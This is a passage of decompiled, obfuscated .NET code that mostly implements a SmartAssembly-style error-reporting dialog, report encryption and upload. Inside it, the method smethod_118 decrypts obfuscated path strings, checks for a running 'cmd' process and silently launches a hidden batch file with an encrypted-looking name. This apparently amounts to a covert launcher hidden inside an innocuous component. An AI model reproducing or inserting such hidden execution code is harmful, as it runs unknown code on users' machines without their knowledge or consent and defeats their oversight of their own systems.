		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, bytes2, 2);
		byte[] bytes3 = rfc2898DeriveBytes.GetBytes(32);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.Mode = CipherMode.CBC;
		ICryptoTransform transform = rijndaelManaged.CreateDecryptor(bytes3, bytes);
		MemoryStream memoryStream = new MemoryStream(array);
		CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read);
		byte[] array2 = new byte[checked(array.Length - 1 + 1)];
		int count = cryptoStream.Read(array2, 0, array2.Length);
		memoryStream.Close();
		cryptoStream.Close();
		return Encoding.UTF8.GetString(array2, 0, count);
	}

	static byte[] smethod_110(byte[] byte_0, string string_0)
	{
		if (string_0.StartsWith("{"))
		{
			Class44.string_0 = "ERR 2006: This template was not properly processed by SmartAssembly";
			return null;
		}
		RijndaelManaged rijndaelManaged = null;
		RSACryptoServiceProvider rSACryptoServiceProvider = null;
		MemoryStream memoryStream = null;
		CryptoStream cryptoStream = null;
		try
		{
			rijndaelManaged = new RijndaelManaged();
			rSACryptoServiceProvider = new RSACryptoServiceProvider();
			rSACryptoServiceProvider.FromXmlString(string_0);
			rijndaelManaged.GenerateKey();
			rijndaelManaged.GenerateIV();
			byte[] array = new byte[48];
			Buffer.BlockCopy(rijndaelManaged.Key, 0, array, 0, 32);
			Buffer.BlockCopy(rijndaelManaged.IV, 0, array, 32, 16);
			memoryStream = new MemoryStream();
			try
			{
				byte[] array2 = rSACryptoServiceProvider.Encrypt(array, fOAEP: false);
				memoryStream.WriteByte(1);
				memoryStream.WriteByte(Convert.ToByte(array2.Length / 8));
				memoryStream.Write(array2, 0, array2.Length);
			}
			catch (CryptographicException)
			{
				try
				{
					byte[] array3 = new byte[16];
					while (true)
					{
						byte[] array4 = new byte[16];
						while (true)
						{
							Buffer.BlockCopy(rijndaelManaged.Key, 0, array3, 0, 16);
							Buffer.BlockCopy(rijndaelManaged.Key, 16, array4, 0, 16);
							byte[] array5 = rSACryptoServiceProvider.Encrypt(array3, fOAEP: false);
							while (true)
							{
								byte[] array6 = rSACryptoServiceProvider.Encrypt(array4, fOAEP: false);
								byte[] array7 = rSACryptoServiceProvider.Encrypt(rijndaelManaged.IV, fOAEP: false);
								int num = 5;
								if (T1fpLDgQ4dlcokqoGbL())
								{
									while (true)
									{
										switch (num)
										{
										default:
											num = 4;
											if (T1fpLDgQ4dlcokqoGbL())
											{
												continue;
											}
											break;
										case 4:
											break;
										case 2:
											goto end_IL_00e6;
										case 0:
										case 1:
											goto end_IL_010e;
										case 3:
										case 5:
											goto IL_014a;
										case 6:
											goto IL_017c;
										}
										break;
									}
									continue;
								}
								goto IL_014a;
								IL_017c:
								memoryStream.Write(array7, 0, array7.Length);
								goto end_IL_013e;
								IL_014a:
								memoryStream.WriteByte(2);
								memoryStream.WriteByte(Convert.ToByte(array5.Length / 8));
								memoryStream.Write(array5, 0, array5.Length);
								memoryStream.Write(array6, 0, array6.Length);
								goto IL_017c;
								continue;
								end_IL_00e6:
								break;
							}
							continue;
							end_IL_010e:
							break;
						}
						continue;
						end_IL_013e:
						break;
					}
				}
				catch (CryptographicException)
				{
					Class44.string_0 = "ERR 2005: The 128-bit encryption is not available on this computer. You need to install the High Encryption Pack in order to use the reporting feature.";
					return null;
				}
			}
			cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			cryptoStream.Write(byte_0, 0, byte_0.Length);
			cryptoStream.FlushFinalBlock();
			return memoryStream.ToArray();
		}
		catch (Exception ex3)
		{
			Class44.string_0 = "ERR 2004: " + ex3.Message;
			return null;
		}
		finally
		{
			rijndaelManaged?.Clear();
			rSACryptoServiceProvider?.Clear();
			memoryStream?.Close();
			cryptoStream?.Close();
		}
	}

	static string smethod_111()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Class31.SubkeyApplication);
			if (T1fpLDgQ4dlcokqoGbL())
			{
				string result = default(string);
				switch (4)
				{
				case 4:
					break;
				case 1:
				case 3:
					goto IL_0051;
				case 5:
					goto IL_0070;
				default:
					return result;
				case 0:
				case 2:
					return result;
				}
			}
			if (registryKey == null)
			{
				registryKey = Registry.LocalMachine.OpenSubKey(Class31.WowSubkeyApplication);
			}
			goto IL_0051;
			IL_0051:
			if (registryKey == null)
			{
				return null;
			}
			string result2 = (string)registryKey.GetValue("Path", null);
			registryKey.Close();
			goto IL_0070;
			IL_0070:
			return result2;
		}
		catch
		{
			return null;
		}
	}

	static int smethod_112(Class32.Stream0 stream0_0)
	{
		return Class21.smethod_56(stream0_0) | (Class21.smethod_56(stream0_0) << 16);
	}

	static void smethod_113(Class46 class46_0, EventArgs0 eventArgs0_0)
	{
		class46_0.delegate19_0?.Invoke(class46_0, eventArgs0_0);
	}

	static void smethod_114(Delegate21 delegate21_0, Class57 class57_0)
	{
		if (class57_0.string_2 == null)
		{
			try
			{
				UploadReportLoginService uploadReportLoginService = new UploadReportLoginService();
				if (class57_0.iwebProxy_0 == null)
				{
					goto IL_0053;
				}
				while (true)
				{
					((HttpWebClientProtocol)uploadReportLoginService).set_Proxy(class57_0.iwebProxy_0);
					if (T1fpLDgQ4dlcokqoGbL())
					{
						switch (3)
						{
						case 0:
						case 2:
							break;
						case 1:
						case 3:
							goto IL_0053;
						default:
							goto end_IL_0019;
						case 5:
							goto IL_008f;
						}
						continue;
					}
					break;
					continue;
					end_IL_0019:
					break;
				}
				goto IL_0072;
				IL_0072:
				throw new ApplicationException("Cannot connect to webservice");
				IL_008f:
				class57_0.string_2 = Class57.string_0;
				goto end_IL_000b;
				IL_0053:
				class57_0.string_2 = uploadReportLoginService.GetServerURL(class57_0.string_1);
				if (class57_0.string_2.Length == 0)
				{
					goto IL_0072;
				}
				if (class57_0.string_2 == "ditto")
				{
					goto IL_008f;
				}
				end_IL_000b:;
			}
			catch (Exception ex)
			{
				delegate21_0("ERR 2001: " + ex.Message);
				return;
			}
		}
		delegate21_0(class57_0.string_2.StartsWith("ERR") ? class57_0.string_2 : "OK");
	}

	static void smethod_115(Class32.Class39.Class40 class40_0, Class32.Class39.Class40 class40_1)
	{
		int num = -1;
		int num2 = 0;
		while (num2 < class40_0.int_1)
		{
			int num3 = 1;
			while (true)
			{
				IL_00fa:
				int num4 = class40_0.byte_0[num2];
				int num5;
				if (num4 != 0)
				{
					num5 = 6;
					goto IL_00e6;
				}
				num5 = 138;
				int num6 = 3;
				goto IL_0018;
				IL_00dc:
				if (num != num4)
				{
					Class21.smethod_37(class40_1, num4);
					num3 = 0;
				}
				goto IL_0018;
				IL_0018:
				num = num4;
				num2++;
				while (true)
				{
					if (num2 < class40_0.int_1)
					{
						goto IL_009f;
					}
					goto IL_00b9;
					IL_00b9:
					while (true)
					{
						int num7;
						if (num3 >= num6)
						{
							if (num != 0)
							{
								num7 = 9;
								if (!T1fpLDgQ4dlcokqoGbL())
								{
									break;
								}
								goto IL_0049;
							}
							if (num3 > 10)
							{
								Class21.smethod_37(class40_1, 18);
								goto IL_007c;
							}
							Class21.smethod_37(class40_1, 17);
							Class21.smethod_21(class40_0.class39_0.class42_0, num3 - 3, 3);
							break;
						}
						while (num3-- > 0)
						{
							Class21.smethod_37(class40_1, num);
						}
						break;
						IL_0049:
						switch (num7)
						{
						case 6:
							break;
						default:
							goto IL_009f;
						case 1:
							continue;
						case 3:
						case 8:
							goto IL_00dc;
						case 4:
							goto IL_00e6;
						case 2:
							goto IL_00fa;
						case 9:
							Class21.smethod_37(class40_1, 16);
							Class21.smethod_21(class40_0.class39_0.class42_0, num3 - 3, 2);
							goto end_IL_00b9;
						case 0:
						case 7:
						case 10:
							goto end_IL_00b9;
						}
						goto IL_007c;
						IL_007c:
						Class21.smethod_21(class40_0.class39_0.class42_0, num3 - 11, 7);
						num7 = 10;
						if (!Ht7G4Qg4FYYvPjn2sqY())
						{
							goto IL_0049;
						}
						goto IL_00e6;
						continue;
						end_IL_00b9:
						break;
					}
					break;
					IL_009f:
					if (num == class40_0.byte_0[num2])
					{
						num2++;
						if (++num3 < num5)
						{
							continue;
						}
					}
					goto IL_00b9;
				}
				break;
				IL_00e6:
				num6 = 3;
				goto IL_00dc;
			}
		}
	}

	static void smethod_116(Class32.Class39 class39_0)
	{
		class39_0.int_1 = 0;
		class39_0.int_2 = 0;
	}

	static int smethod_117(Class32.Class35 class35_0, Class32.Class34 class34_0, int int_0)
	{
		int_0 = Math.Min(Math.Min(int_0, 32768 - class35_0.int_1), class34_0.AvailableBytes);
		int num = 3;
		if (Ht7G4Qg4FYYvPjn2sqY())
		{
			goto IL_0098;
		}
		goto IL_00c8;
		IL_00c8:
		int num3 = default(int);
		int num2 = default(int);
		while (true)
		{
			switch (num)
			{
			case 4:
				break;
			case 1:
				goto IL_0092;
			case 2:
			case 5:
				goto IL_0098;
			case 0:
			case 3:
				num3 = 32768 - class35_0.int_0;
				goto IL_0092;
			default:
				num = 5;
				if (!Ht7G4Qg4FYYvPjn2sqY())
				{
				}
				continue;
			case 6:
				return num2;
			}
			break;
		}
		goto IL_0045;
		IL_0031:
		class35_0.int_0 = (class35_0.int_0 + num2) & 0x7FFF;
		goto IL_0045;
		IL_0045:
		class35_0.int_1 += num2;
		num = 6;
		if (!T1fpLDgQ4dlcokqoGbL())
		{
			goto IL_0092;
		}
		goto IL_00c8;
		IL_0098:
		num2 += Class21.smethod_120(class34_0, class35_0.byte_0, 0, int_0 - num3);
		goto IL_0031;
		IL_0092:
		if (int_0 > num3)
		{
			num2 = Class21.smethod_120(class34_0, class35_0.byte_0, class35_0.int_0, num3);
			if (num2 == num3)
			{
				goto IL_0098;
			}
		}
		else
		{
			num2 = Class21.smethod_120(class34_0, class35_0.byte_0, class35_0.int_0, int_0);
		}
		goto IL_0031;
	}

	static void smethod_118()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		ProcessStartInfo processStartInfo = default(ProcessStartInfo);
		string text2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text;
				string text3;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 228:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002a;
						case 4:
							goto IL_004c;
						case 5:
							goto IL_0055;
						case 6:
							goto IL_0064;
						case 7:
							goto IL_0082;
						case 8:
							goto IL_008c;
						case 9:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 10:
						case 11:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_008c:
					num = 8;
					processStartInfo.CreateNoWindow = true;
					break;
					IL_0008:
					num = 2;
					text = Interaction.Environ(Class21.smethod_154("5g+BxFHXkdTcEM3cEGgk0A==")) + Class21.smethod_154("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
					goto IL_002a;
					IL_002a:
					num = 3;
					text2 = Interaction.Environ(Class21.smethod_154("5g+BxFHXkdTcEM3cEGgk0A==")) + Class21.smethod_154("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=");
					goto IL_004c;
					IL_004c:
					num = 4;
					text3 = "cm";
					goto IL_0055;
					IL_0055:
					num = 5;
					if (Class21.smethod_63("cmd"))
					{
						goto end_IL_0000_3;
					}
					goto IL_0064;
					IL_0064:
					num = 6;
					processStartInfo = new ProcessStartInfo(text2 + Class21.smethod_154("fEzc44351CMchjFeeY23eA==") + "\\qJ1rx6zo0JWv6cXezCyOGQ==.bat");
					goto IL_0082;
					IL_0082:
					num = 7;
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					goto IL_008c;
					end_IL_0000_2:
					break;
				}
				num = 9;
				Process.Start(processStartInfo);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 228;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static int smethod_119(Class32.Class41 class41_0)
	{
		int num = ((class41_0.int_0 << 5) ^ class41_0.byte_0[class41_0.int_4 + 2]) & 0x7FFF;
		short num2 = (class41_0.short_1[class41_0.int_4 & 0x7FFF] = class41_0.short_0[num]);
		class41_0.short_0[num] = (short)class41_0.int_4;
		class41_0.int_0 = num;
		return num2 & 0xFFFF;
	}

	static int smethod_120(Class32.Class34 class34_0, byte[] byte_0, int int_0, int int_1)
	{
		int num = 0;
		while (class34_0.int_2 > 0 && int_1 > 0)
		{
			byte_0[int_0++] = (byte)class34_0.uint_0;
			class34_0.uint_0 >>= 8;
			class34_0.int_2 -= 8;
			int_1--;
			num++;
		}
		if (int_1 == 0)
		{
			return num;
		}
		int num2 = class34_0.int_1 - class34_0.int_0;
		if (int_1 > num2)
		{
			int_1 = num2;
		}
		Array.Copy(class34_0.byte_0, class34_0.int_0, byte_0, int_0, int_1);
		class34_0.int_0 += int_1;
		if (((uint)(class34_0.int_0 - class34_0.int_1) & (true ? 1u : 0u)) != 0)
		{
			class34_0.uint_0 = class34_0.byte_0[class34_0.int_0++] & 0xFFu;
			class34_0.int_2 = 8;
		}
		return num + int_1;
	}

	static void smethod_121(Form0 form0_0)
	{
		//IL_01d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e1: Expected O, but got Unknown
		//IL_0cad: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cb7: Expected O, but got Unknown
		//IL_0cc3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ccd: Expected O, but got Unknown
		//IL_0d7e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d88: Expected O, but got Unknown
		//IL_0d89: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d93: Expected O, but got Unknown
		//IL_0d94: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d9e: Expected O, but got Unknown
		//IL_0de1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0deb: Expected O, but got Unknown
		//IL_0dec: Unknown result type (might be due to invalid IL or missing references)
		//IL_0df6: Expected O, but got Unknown
		//IL_0df7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e01: Expected O, but got Unknown
		//IL_0e02: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e0c: Expected O, but got Unknown
		//IL_0e18: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e22: Expected O, but got Unknown
		//IL_0f91: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f9b: Expected O, but got Unknown
		//IL_0f9c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fa6: Expected O, but got Unknown
		//IL_0fa7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fb1: Expected O, but got Unknown
		//IL_0fb2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fbc: Expected O, but got Unknown
		//IL_0fbd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fc7: Expected O, but got Unknown
		//IL_0fc8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fd2: Expected O, but got Unknown
		//IL_0fe9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ff3: Expected O, but got Unknown
		//IL_0ff4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ffe: Expected O, but got Unknown
		//IL_1137: Unknown result type (might be due to invalid IL or missing references)
		//IL_1141: Expected O, but got Unknown
		while (true)
		{
			IL_1136:
			form0_0.panel_0 = new Panel();
			int num = 37;
			if (!T1fpLDgQ4dlcokqoGbL())
			{
				goto IL_0f42;
			}
			goto IL_1010;
			IL_1010:
			while (true)
			{
				switch (num)
				{
				case 68:
					((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.control1_0);
					((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.class54_0);
					((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.button_7);
					goto case 21;
				case 21:
					((Control)form0_0.panel_0).set_Location(new Point(8, 8));
					((Control)form0_0.panel_0).set_Name("panelInformation");
					((Control)form0_0.panel_0).set_Size(new Size(413, 240));
					((Control)form0_0.panel_0).set_TabIndex(0);
					((Control)form0_0.button_5).set_Anchor((AnchorStyles)10);
					((ButtonBase)form0_0.button_5).set_FlatStyle((FlatStyle)3);
					((Control)form0_0.button_5).set_Location(new Point(66, 205));
					((Control)form0_0.button_5).set_Name("debug");
					((Control)form0_0.button_5).set_Size(new Size(64, 24));
					((Control)form0_0.button_5).set_TabIndex(13);
					((Control)form0_0.button_5).set_Text("Debug");
					((Control)form0_0.button_5).set_Visible(false);
					goto case 7;
				case 7:
					((Control)form0_0.button_5).add_Click((EventHandler)form0_0.method_11);
					((Control)form0_0.checkBox_0).set_Anchor((AnchorStyles)6);
					((ButtonBase)form0_0.checkBox_0).set_FlatStyle((FlatStyle)3);
					((Control)form0_0.checkBox_0).set_Location(new Point(22, 99));
					goto case 1;
				case 1:
					((Control)form0_0.checkBox_0).set_Name("continueCheckBox");
					((Control)form0_0.checkBox_0).set_Size(new Size(226, 16));
					((Control)form0_0.checkBox_0).set_TabIndex(14);
					((Control)form0_0.checkBox_0).set_Text("Ignore this error and attempt to &continue.");
					goto case 57;
				case 57:
					form0_0.checkBox_0.add_CheckedChanged((EventHandler)form0_0.method_4);
					((Control)form0_0.label_0).set_Anchor((AnchorStyles)14);
					form0_0.label_0.set_FlatStyle((FlatStyle)3);
					goto case 6;
				case 6:
					((Control)form0_0.label_0).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
					((Control)form0_0.label_0).set_Location(new Point(20, 124));
					((Control)form0_0.label_0).set_Name("pleaseTellTitle");
					((Control)form0_0.label_0).set_Size(new Size(381, 16));
					goto case 2;
				case 2:
					((Control)form0_0.label_0).set_TabIndex(11);
					((Control)form0_0.label_0).set_Text("Please tell %CompanyName% about this problem.");
					goto case 24;
				case 24:
					((Control)form0_0.button_0).set_Anchor((AnchorStyles)10);
					goto case 33;
				case 33:
					((ButtonBase)form0_0.button_0).set_FlatStyle((FlatStyle)3);
					((Control)form0_0.button_0).set_Location(new Point(325, 205));
					((Control)form0_0.button_0).set_Name("dontSendReport");
					((Control)form0_0.button_0).set_Size(new Size(75, 24));
					break;
				case 47:
					break;
				case 38:
					goto IL_02d0;
				case 29:
					goto IL_02f6;
				case 58:
					goto IL_031a;
				case 65:
					goto IL_03ec;
				case 51:
					goto IL_043d;
				case 0:
					goto IL_0455;
				case 10:
					goto IL_04a2;
				case 19:
					goto IL_0525;
				case 25:
					goto IL_05af;
				case 12:
					goto IL_05eb;
				case 66:
					((Control)form0_0.panel_2).get_Controls().Add((Control)(object)form0_0.button_6);
					((Control)form0_0.panel_2).set_Location(new Point(11, 512));
					goto case 59;
				case 59:
					((Control)form0_0.panel_2).set_Name("panelEmail");
					((Control)form0_0.panel_2).set_Size(new Size(413, 232));
					((Control)form0_0.panel_2).set_TabIndex(4);
					((Control)form0_0.panel_2).set_Visible(false);
					form0_0.label_3.set_FlatStyle((FlatStyle)3);
					((Control)form0_0.label_3).set_Location(new Point(20, 131));
					((Control)form0_0.label_3).set_Name("labelEmail");
					((Control)form0_0.label_3).set_Size(new Size(100, 16));
					((Control)form0_0.label_3).set_TabIndex(9);
					((Control)form0_0.label_3).set_Text("&Email address:");
					((ButtonBase)form0_0.checkBox_1).set_FlatStyle((FlatStyle)3);
					((Control)form0_0.checkBox_1).set_Location(new Point(120, 160));
					num = 48;
					if (!Ht7G4Qg4FYYvPjn2sqY())
					{
						continue;
					}
					goto case 64;
				case 42:
					((Control)form0_0.control0_2).set_Location(new Point(24, 120));
					((Control)form0_0.control0_2).set_Name("transferingFeedback");
					((Control)form0_0.control0_2).set_Size(new Size(368, 16));
					((Control)form0_0.control0_2).set_TabIndex(20);
					((Control)form0_0.control0_2).set_TabStop(false);
					((Control)form0_0.control0_2).set_Text("Transferring report.");
					goto case 36;
				case 36:
					((Control)form0_0.control0_3).set_Location(new Point(24, 144));
					((Control)form0_0.control0_3).set_Name("completedFeedback");
					((Control)form0_0.control0_3).set_Size(new Size(368, 16));
					goto case 18;
				case 18:
					((Control)form0_0.control0_3).set_TabIndex(21);
					((Control)form0_0.control0_3).set_TabStop(false);
					((Control)form0_0.control0_3).set_Text("Error reporting completed. Thank you.");
					((Control)form0_0.panel_2).get_Controls().Add((Control)(object)form0_0.label_3);
					((Control)form0_0.panel_2).get_Controls().Add((Control)(object)form0_0.checkBox_1);
					((Control)form0_0.panel_2).get_Controls().Add((Control)(object)form0_0.textBox_0);
					((Control)form0_0.panel_2).get_Controls().Add((Control)(object)form0_0.control1_2);
					((Control)form0_0.panel_2).get_Controls().Add((Control)(object)form0_0.label_2);
					goto case 66;
				case 64:
					((Control)form0_0.control0_1).set_Text("Connecting to server.");
					goto case 42;
				case 63:
					((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.control1_1);
					((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.control0_0);
					goto case 14;
				case 14:
					((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.control0_1);
					goto case 5;
				case 5:
					((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.control0_2);
					((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.control0_3);
					((Control)form0_0.panel_1).set_Location(new Point(8, 264));
					((Control)form0_0.panel_1).set_Name("panelSending");
					((Control)form0_0.panel_1).set_Size(new Size(413, 232));
					((Control)form0_0.panel_1).set_TabIndex(2);
					((Control)form0_0.panel_1).set_Visible(false);
					((Control)form0_0.button_2).set_Anchor((AnchorStyles)10);
					goto case 28;
				case 28:
					((ButtonBase)form0_0.button_2).set_FlatStyle((FlatStyle)3);
					((Control)form0_0.button_2).set_Location(new Point(320, 197));
					((Control)form0_0.button_2).set_Name("cancelSending");
					((Control)form0_0.button_2).set_Size(new Size(80, 24));
					((Control)form0_0.button_2).set_TabIndex(10);
					((Control)form0_0.button_2).set_Text("&Cancel");
					goto case 32;
				case 32:
					((Control)form0_0.button_2).add_Click((EventHandler)form0_0.method_2);
					((Control)form0_0.button_3).set_Anchor((AnchorStyles)10);
					((Control)form0_0.button_3).set_Enabled(false);
					goto case 11;
				case 11:
					((ButtonBase)form0_0.button_3).set_FlatStyle((FlatStyle)3);
					((Control)form0_0.button_3).set_Location(new Point(232, 197));
					((Control)form0_0.button_3).set_Name("ok");
					goto case 53;
				case 53:
					((Control)form0_0.button_3).set_Size(new Size(80, 24));
					((Control)form0_0.button_3).set_TabIndex(22);
					((Control)form0_0.button_3).set_Text("&OK");
					((Control)form0_0.button_3).add_Click((EventHandler)form0_0.method_3);
					((Control)form0_0.button_4).set_Anchor((AnchorStyles)10);
					goto default;
				default:
					((ButtonBase)form0_0.button_4).set_FlatStyle((FlatStyle)3);
					((Control)form0_0.button_4).set_Location(new Point(144, 197));
					((Control)form0_0.button_4).set_Name("retrySending");
					((Control)form0_0.button_4).set_Size(new Size(80, 24));
					((Control)form0_0.button_4).set_TabIndex(23);
					((Control)form0_0.button_4).set_Text("&Retry");
					((Control)form0_0.button_4).set_Visible(false);
					goto case 9;
				case 9:
					((Control)form0_0.button_4).add_Click((EventHandler)form0_0.method_9);
					((Control)form0_0.control3_0).set_Location(new Point(87, 145));
					goto case 46;
				case 46:
					((Control)form0_0.control3_0).set_Name("waitSendingReport");
					((Control)form0_0.control3_0).set_Size(new Size(250, 42));
					goto case 16;
				case 16:
					((Control)form0_0.control3_0).set_TabIndex(11);
					((Control)form0_0.control3_0).set_TabStop(false);
					((Control)form0_0.control3_0).set_Visible(false);
					((Control)form0_0.control1_1).set_BackColor(Color.FromArgb(36, 96, 179));
					((Control)form0_0.control1_1).set_Dock((DockStyle)1);
					((Control)form0_0.control1_1).set_ForeColor(Color.White);
					goto case 62;
				case 62:
					form0_0.control1_1.IconState = Enum5.const_1;
					form0_0.control1_1.Image = null;
					((Control)form0_0.control1_1).set_Location(new Point(0, 0));
					((Control)form0_0.control1_1).set_Name("headerControl2");
					((Control)form0_0.control1_1).set_Size(new Size(413, 58));
					((Control)form0_0.control1_1).set_TabIndex(24);
					goto case 27;
				case 27:
					((Control)form0_0.control1_1).set_TabStop(false);
					((Control)form0_0.control1_1).set_Text("Please wait while %AppName% is sending the report to %CompanyName% through the Internet.");
					((Control)form0_0.control0_0).set_Location(new Point(24, 72));
					((Control)form0_0.control0_0).set_Name("preparingFeedback");
					((Control)form0_0.control0_0).set_Size(new Size(368, 16));
					((Control)form0_0.control0_0).set_TabIndex(18);
					((Control)form0_0.control0_0).set_TabStop(false);
					((Control)form0_0.control0_0).set_Text("Preparing the error report.");
					((Control)form0_0.control0_1).set_Location(new Point(24, 96));
					((Control)form0_0.control0_1).set_Name("connectingFeedback");
					((Control)form0_0.control0_1).set_Size(new Size(368, 16));
					goto case 41;
				case 41:
				case 61:
					((Control)form0_0.control0_1).set_TabIndex(19);
					((Control)form0_0.control0_1).set_TabStop(false);
					goto case 64;
				case 60:
					form0_0.button_6 = new Button();
					form0_0.control2_0 = new Control2();
					form0_0.button_8 = new Button();
					((Control)form0_0.panel_0).SuspendLayout();
					((Control)form0_0.panel_1).SuspendLayout();
					((Control)form0_0.panel_2).SuspendLayout();
					((Control)form0_0).SuspendLayout();
					((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.button_5);
					((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.checkBox_0);
					((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.label_0);
					goto case 20;
				case 20:
					((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.button_0);
					goto case 15;
				case 15:
					((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.button_1);
					((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.label_1);
					goto case 68;
				case 56:
					form0_0.button_2 = new Button();
					form0_0.button_3 = new Button();
					form0_0.button_4 = new Button();
					form0_0.control3_0 = new Control3();
					form0_0.control1_1 = new Control1();
					form0_0.control0_0 = new Control0();
					form0_0.control0_1 = new Control0();
					form0_0.control0_2 = new Control0();
					form0_0.control0_3 = new Control0();
					form0_0.panel_2 = new Panel();
					goto case 17;
				case 17:
					form0_0.label_3 = new Label();
					form0_0.checkBox_1 = new CheckBox();
					form0_0.textBox_0 = new TextBox();
					goto case 8;
				case 8:
					form0_0.control1_2 = new Control1();
					form0_0.label_2 = new Label();
					goto case 60;
				case 55:
					goto IL_0e27;
				case 31:
					goto IL_0e71;
				case 43:
					goto IL_0e88;
				case 48:
					((Control)form0_0.checkBox_1).set_Name("sendAnonymously");
					((Control)form0_0.checkBox_1).set_Size(new Size(232, 16));
					((Control)form0_0.checkBox_1).set_TabIndex(11);
					((Control)form0_0.checkBox_1).set_Text("I prefer to send this report &anonymously.");
					form0_0.checkBox_1.add_CheckedChanged((EventHandler)form0_0.method_14);
					((Control)form0_0.textBox_0).set_Location(new Point(120, 128));
					((Control)form0_0.textBox_0).set_Name("email");
					((Control)form0_0.textBox_0).set_Size(new Size(256, 20));
					goto IL_0f42;
				case 45:
					goto IL_0f42;
				case 22:
					goto IL_0f66;
				case 4:
					goto IL_0f7f;
				case 37:
					form0_0.button_5 = new Button();
					form0_0.checkBox_0 = new CheckBox();
					form0_0.label_0 = new Label();
					form0_0.button_0 = new Button();
					form0_0.button_1 = new Button();
					form0_0.label_1 = new Label();
					form0_0.control1_0 = new Control1();
					form0_0.class54_0 = new Class54();
					form0_0.button_7 = new Button();
					form0_0.panel_1 = new Panel();
					num = 56;
					if (!Ht7G4Qg4FYYvPjn2sqY())
					{
						continue;
					}
					goto case 53;
				case 40:
					goto IL_1136;
				case 26:
					((Control)form0_0.control1_2).set_TabStop(false);
					((Control)form0_0.control1_2).set_Text("Do you want to be contacted by %CompanyName% regarding this problem?");
					((Control)form0_0.label_2).set_Anchor((AnchorStyles)13);
					form0_0.label_2.set_FlatStyle((FlatStyle)3);
					((Control)form0_0.label_2).set_Location(new Point(20, 69));
					((Control)form0_0.label_2).set_Name("label3");
					((Control)form0_0.label_2).set_Size(new Size(381, 43));
					((Control)form0_0.label_2).set_TabIndex(10);
					goto case 54;
				case 54:
					((Control)form0_0.label_2).set_Text("If you want to be contacted by %CompanyName% regarding this error, please provide your e-mail address. This information will not be used for any other purpose.");
					((Control)form0_0.button_6).set_Anchor((AnchorStyles)10);
					((Control)form0_0.button_6).set_Enabled(false);
					((ButtonBase)form0_0.button_6).set_FlatStyle((FlatStyle)3);
					((Control)form0_0.button_6).set_Location(new Point(295, 197));
					((Control)form0_0.button_6).set_Name("continueSendReport");
					goto case 67;
				case 67:
					((Control)form0_0.button_6).set_Size(new Size(105, 24));
					goto case 69;
				case 69:
					((Control)form0_0.button_6).set_TabIndex(12);
					((Control)form0_0.button_6).set_Text("&Send Error Report");
					((Control)form0_0.button_6).add_Click((EventHandler)form0_0.method_12);
					((Control)form0_0.control2_0).set_Anchor((AnchorStyles)6);
					((Control)form0_0.control2_0).set_Cursor(Cursors.get_Hand());
					goto case 44;
				case 44:
					((Control)form0_0.control2_0).set_Location(new Point(6, 730));
					((Control)form0_0.control2_0).set_Name("poweredBy");
					((Control)form0_0.control2_0).set_Size(new Size(112, 32));
					((Control)form0_0.control2_0).set_TabIndex(5);
					goto case 52;
				case 52:
					((Control)form0_0.control2_0).set_TabStop(false);
